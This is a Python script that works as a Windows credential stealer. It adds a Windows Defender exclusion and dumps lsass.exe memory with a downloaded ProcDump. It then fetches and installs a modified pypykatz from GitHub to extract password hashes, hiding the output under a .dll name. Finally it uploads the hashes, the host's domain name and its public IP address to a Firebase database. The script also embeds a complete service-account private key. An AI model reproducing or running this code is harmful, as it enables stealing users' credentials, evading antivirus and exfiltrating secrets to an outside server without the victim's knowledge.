import firebase_admin
from firebase_admin import credentials
from firebase_admin import db
import os,json,random,time
from datetime import datetime 
from win32com.shell import shell
from requests import get
from colorama import Fore,Back as bg



def password_gen(length):
    characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    password = ""
    for i in range(length):
        password += random.choice(characters.lower())
    return password


__chars__ = password_gen(10)
__cat__ = password_gen(10)
__folder__ = password_gen(10)
__site__ = password_gen(10)
__out__ = password_gen(10)

# Change this to your firebase credentials 
creds_content = {
  "type": "service_account",
  "project_id": "password-database-1a0d7",
  "private_key_id": "25456beb48b7c74b48bcecf6acd15a390ae86ecf",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCyn7vv7m1zi6OY\nQqPNhaPf95GhaXvq8ilsSnW+fEq9KnDgCczJ8LIP6cOv0FT1EQxgrNvf2GUX50Ix\n3EfaWuQ+EH1TwuaxnnSzh/W/scoPg8L9mnvAcWzgOBQVAE2VlFVH1mOStQIRGG+Y\n2swlNfn31jf8T9UEQbhlMit3wyu8upB+2kfV+5I32PcV2iWDmvYXxyOTWdNmm8gZ\nj9gzqDKcEMYIvONnEJS3NaylI6bXloclP7KNUjKnSLUNKE0lQ22pRlpJN/eV6DoT\nL2KGMZkMdb3nj4zh42bjlYbxCbcvS90GpruApumWewSj4KKQfuagQMShrdbaoO8N\nuE7YHbyDAgMBAAECggEAArDms0NToXgAa5zQEZqVJhykCbB9zhj+iBkfE6g/tVXc\nWXkMUsaDiDssrYtlRu6OJy6zfqMonWbogmPKg/72jVDQ8orEevc41DOU1OHSz3pc\nB6y6IeNo5n/ccuyMPq1QvkJRQbaPD2mKKjKxp1CG3DWn+5nK9cN1CbaVx7odqzww\nhj5Uwf5FgHNM+LJ1su2Ie5Db0K1l1+UN6v3a+bqCrJIyMK+CFUFLYcJm4ETRyANB\niQ4yvNCTSQkCO/CIU6MITN1lu6wRE/LvuDcywBRYhXdiaS3JXX0dSonm05q3MRHX\n6KJolKIYsnZ4l/hYsew8WjnhuPYdLVVQkqclHuQ8EQKBgQDXjgjX32o7PD1rwk97\n/bVZAhL8pZhjTHl/BBrK1FQG7mKB7VNoL6QvFsWUjaDy28ibnmxTFuoQha6PZM4t\nyw/ikbyg+sYr2togQPQ3N2i6WO7ySFAvz1DrND5H1dNpo26BX9MAP1CDB5RkyBHu\nQmIwag+CKEwPuNqlOnod05zexwKBgQDUI8MA58frn/VoEHK0kl5riStpFIGxG0i1\nR6TxIcCesW5I5C0gyaX3PnwHfyFfPb1FKIPpqF4U7B0EDO2sL6wKVzo6U1YeAZOh\nu7HYAWgWaOCKIumooDCeABnf0VkvsqlrmnjW/OI99wDMKxPY4X1wmo+nB9ubBim0\nfF6TBH9oZQKBgDUJOHnM+blbaA1kgOQUF5Ov4/YP1H/SKC6tVt5DAe22p7wqJZSD\n7FS9uJ2Ff21h0GkhwKts/uhTzBByEBzKUr0/eHbvXOUbcwHumWgglP8MtLYePsSU\nsOc+MnjATsU2NhFU/3iXG3sx2Tw20dqasMgSwIAY5CYWKI3w5m0CTR2vAoGBAKLr\nMAiS+NN5TkP0VdNdkYvulVsm948nkAhAlGjnbgGx7CuoqQvEMWSXJTOwq9V0GdZy\nDhS1TEOvLX193E3fcrWiVcKTW9DBjzqnZiaoteJ3+vG7bE0ncQ72ruhX47Gg+UH9\nKQ6aubmy53blImHukqKW4Pn7K+l7qy3EUfGAg8SNAoGBAKU0RtAbuxJXbewtrLsX\nzg7LRKv1A3V5FM3myiB52l7oBBZDDgZXgQjiSwmkgMgplUHskRB5r200Qq855Cfa\n2y08Srf5eQmD5JjJUwImlkxHO2QN76zWSjvQeCcIEGqIQvLSOsDDLYdUHcBD8hYb\ntlTHUmqD15qumqZabebYdq06\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-efs91@password-database-1a0d7.iam.gserviceaccount.com",
  "client_id": "105889749184857313883",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-efs91%40password-database-1a0d7.iam.gserviceaccount.com"
}


with open(f"{os.environ['TEMP']}\\firebase_auth.json","w") as f:
    json.dump(creds_content,f)


if(os.path.isfile(os.environ['TEMP'] + "\\firebase_auth.json") == True):
    cred = credentials.Certificate(os.environ['TEMP'] + "\\firebase_auth.json")
else:
    print("File not found")


firebase_admin.initialize_app(cred, {
    'databaseURL': "https://password-database-1a0d7-default-rtdb.firebaseio.com/"
})

class Firebase:
    def __init__(self):
        self.__db = db

    @staticmethod
    def initialize_file():
        print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Initializing required files...")
        proc_path = os.environ['HOMEPATH'] + '\\' + __chars__ + ".zip"
        exclude_path = os.system(f"powershell.exe -Command Add-MpPreference -ExclusionPath {os.environ['HOMEPATH']}")
        get_file = os.system(f"powershell.exe -Command Invoke-WebRequest https://download.sysinternals.com/files/Procdump.zip -o {proc_path}")
        
        if(os.path.isfile(proc_path) == True):
            os.system(f"powershell.exe -Command Expand-Archive -Path {proc_path} -DestinationPath {os.environ['HOMEPATH']}\\{__chars__} -Verbose")
          
        else:
            print(f"{Fore.WHITE}[{Fore.RED}+{Fore.WHITE}]File not found")
        
        if(os.path.isfile(f"{os.environ['HOMEPATH']}\\{__chars__}\\procdump.exe") == True):
            os.system(f"powershell.exe -Command  {os.environ['HOMEPATH']}\\{__chars__}\\procdump.exe -accepteula -r -ma lsass.exe {os.environ['HOMEPATH']}\\{__chars__}.dmp")
            time.sleep(1)
            print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}]Initializing Files Complete!")
    
    def pypykatz(self):
        pyscripts_path = f"{os.environ['LOCALAPPDATA']}\\packages\\pythonsoftwarefoundation.python.3.10_qbz5n2kfra8p0\\localcache\\local-packages\\python310\\site-packages"
        if os.path.isfile(f"{os.environ['HOMEPATH']}\\{__cat__}\\pypykatz-modified-master") == True:
            pass
        else:
            grab_repo = os.system(f"powershell.exe -Command Invoke-WebRequest https://github.com/FonderElite/pypykatz-modified/archive/refs/heads/master.zip -o {os.environ['HOMEPATH']}\\{__cat__}.zip")
            if(os.path.isfile(f"{os.environ['HOMEPATH']}\\{__cat__}.zip") == True):
                os.system(f"powershell.exe -Command Expand-Archive -Path {os.environ['HOMEPATH']}\\{__cat__}.zip -DestinationPath {os.environ['HOMEPATH']}\\{__cat__} -Verbose")
       
        #Install pypykatz
        os.chdir(f"{os.environ['HOMEPATH']}\\{__cat__}\\pypykatz-modified-master")
        os.system(f"powershell.exe -Command python3 setup.py install --user")

        #Execute pypykatz
        os.chdir(f"{os.environ['LOCALAPPDATA']}\\Packages\\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python310\\Scripts")
        os.system(f"pypykatz.exe lsa minidump {os.environ['HOMEPATH']}\\{__chars__}.dmp --json -o {os.environ['HOMEPATH']}\\{__out__}.dll")
        

    @property 
    def fire_base(self):
        return self.__db

    @fire_base.setter
    def fire_base(self,database):
        self.__db = database

        ref = db.reference(self.__db)
        users_ref = ref.child("users")
        hash_file = open(f"{os.environ['HOMEPATH']}\\{__out__}.dll","r")
        read_file = hash_file.readlines()
        users_ref.set({
            os.environ["USERDOMAIN"]: {
                "Date":str(datetime.now()),
                "IP": get('https://api.ipify.org').text,
                "Hash-Dump":read_file
            }
            })
        hash_file.close()
      

if(__name__ == "__main__"):
        firebase = Firebase()
        firebase.initialize_file()
        firebase.pypykatz()
        firebase.fire_base = 'py/'
        


